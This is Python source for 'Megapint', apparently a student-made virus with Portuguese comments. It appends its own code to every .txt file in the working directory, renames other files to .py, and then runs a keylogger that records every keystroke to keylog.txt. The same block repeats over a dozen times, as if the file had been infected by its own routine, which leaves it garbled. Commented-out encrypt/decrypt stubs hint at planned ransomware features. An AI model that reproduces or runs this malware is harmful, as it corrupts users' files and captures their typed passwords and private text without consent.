    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
